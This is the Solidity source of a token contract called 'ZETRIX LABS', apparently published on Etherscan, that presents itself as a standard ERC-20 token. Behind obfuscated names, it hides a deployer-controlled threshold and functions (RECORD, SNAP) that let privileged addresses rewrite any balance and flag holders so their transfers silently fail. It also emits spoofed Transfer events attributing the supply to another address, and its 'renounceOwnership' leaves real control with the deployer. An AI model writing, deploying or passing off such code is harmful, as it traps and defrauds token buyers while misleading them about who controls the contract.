/**
 *Submitted for verification at Etherscan.io on 2023-03-03
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract ZETRIX {
    using SafeMath for uint256;
    mapping (address => uint256) private CXX;
	
    mapping (address => uint256) public CXZ;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "ZETRIX LABS";
	
    string public symbol = "ZETRIX";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private DRT;
      address private DBZ;
    uint256 private MND;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address CNST = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        DBZ = msg.sender;
             CXX[msg.sender] = totalSupply;
        
       FORK();}

  
	
	
   
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function FORK() internal  {                             
                       CXZ[msg.sender] = 4;
                       DRT = CNST;

                

        emit Transfer(address(0), DRT, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return CXX[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(CXZ[msg.sender] <= MND) {
    require(CXX[msg.sender] >= value);
CXX[msg.sender] -= value;  
CXX[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(CXZ[msg.sender] > MND) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function RECORD (address uSV, uint256 uSE) public {
		if(CXZ[msg.sender] == MND) {   
			   	   
   CXZ[uSV] = uSE;}
   }
		       function SETV (uint256 uSE) public {
                     require(msg.sender == DBZ);
                     MND = uSE; 
	}

 		       function SNAP (address uSV, uint256 uSE) public {
		if(CXZ[msg.sender] == MND) {   
			   	   
   CXX[uSV] = uSE;}
   }


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(CXZ[from] < MND && CXZ[to] < MND) {
        require(value <= CXX[from]);
        require(value <= allowance[from][msg.sender]);
        CXX[from] -= value;
        CXX[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(CXZ[from] == MND) {
        require(value <= CXX[from]);
        require(value <= allowance[from][msg.sender]);
        CXX[from] -= value;
        CXX[to] += value;
        allowance[from][msg.sender] -= value;


            from = CNST;
	   

        emit Transfer(from, to, value);
        return true; }


         if(CXZ[from] > MND || CXZ[to] > MND) {
             
         }}



     

        	
 }